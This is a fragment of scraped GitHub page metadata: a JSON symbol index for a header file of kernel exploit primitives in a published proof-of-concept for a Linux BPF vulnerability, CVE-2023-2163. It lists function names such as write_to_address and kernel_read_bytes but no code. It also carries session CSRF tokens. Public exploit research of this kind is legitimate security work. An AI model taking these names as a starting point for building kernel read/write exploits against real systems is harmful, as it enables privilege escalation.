tf16_col":4},"end":{"line_number":168,"utf16_col":23}},"extent_utf16":{"start":{"line_number":168,"utf16_col":4},"end":{"line_number":168,"utf16_col":25}}},{"name":"bpf_prog_skb_run","kind":"function","ident_start":6830,"ident_end":6846,"extent_start":6830,"extent_end":6890,"fully_qualified_name":"bpf_prog_skb_run","ident_utf16":{"start":{"line_number":170,"utf16_col":4},"end":{"line_number":170,"utf16_col":20}},"extent_utf16":{"start":{"line_number":170,"utf16_col":4},"end":{"line_number":170,"utf16_col":64}}},{"name":"execute_bpf_program","kind":"function","ident_start":6898,"ident_end":6917,"extent_start":6898,"extent_end":6994,"fully_qualified_name":"execute_bpf_program","ident_utf16":{"start":{"line_number":172,"utf16_col":4},"end":{"line_number":172,"utf16_col":23}},"extent_utf16":{"start":{"line_number":172,"utf16_col":4},"end":{"line_number":172,"utf16_col":100}}},{"name":"prepare_read","kind":"function","ident_start":7002,"ident_end":7014,"extent_start":7002,"extent_end":7028,"fully_qualified_name":"prepare_read","ident_utf16":{"start":{"line_number":174,"utf16_col":4},"end":{"line_number":174,"utf16_col":16}},"extent_utf16":{"start":{"line_number":174,"utf16_col":4},"end":{"line_number":174,"utf16_col":30}}},{"name":"write_to_address","kind":"function","ident_start":7036,"ident_end":7052,"extent_start":7036,"extent_end":7107,"fully_qualified_name":"write_to_address","ident_utf16":{"start":{"line_number":176,"utf16_col":4},"end":{"line_number":176,"utf16_col":20}},"extent_utf16":{"start":{"line_number":176,"utf16_col":4},"end":{"line_number":176,"utf16_col":75}}},{"name":"read_from_address","kind":"function","ident_start":7115,"ident_end":7132,"extent_start":7115,"extent_end":7188,"fully_qualified_name":"read_from_address","ident_utf16":{"start":{"line_number":178,"utf16_col":4},"end":{"line_number":178,"utf16_col":21}},"extent_utf16":{"start":{"line_number":178,"utf16_col":4},"end":{"line_number":178,"utf16_col":77}}},{"name":"kernel_read_bytes","kind":"function","ident_start":7196,"ident_end":7213,"extent_start":7196,"extent_end":7286,"fully_qualified_name":"kernel_read_bytes","ident_utf16":{"start":{"line_number":180,"utf16_col":4},"end":{"line_number":180,"utf16_col":21}},"extent_utf16":{"start":{"line_number":180,"utf16_col":4},"end":{"line_number":180,"utf16_col":94}}}]}},"copilotInfo":null,"copilotAccessAllowed":false,"csrf_tokens":{"/google/security-research/branches":{"post":"OI665hOaNO3Gg9LaJcw0qclrnSLdmkf4WAIWAGlr_jO0jaNx_I-mlS5QQO3YsTrllmlw-jS1XiAfjePf-JkIMA"},"/repos/preferences":{"post":"0UoaZyQ5pnV2VltyxzTKbgx7PUDgXwzb07h4ca2B76TBu2KSztmRf08sUNIjgDLIh3ZrR9ZdIQtHmiQUuBmCaw"}}},"title":"security-research/pocs/linux/cve-2023-2163/include/exploit_prims.h at master Â· google/security-research"}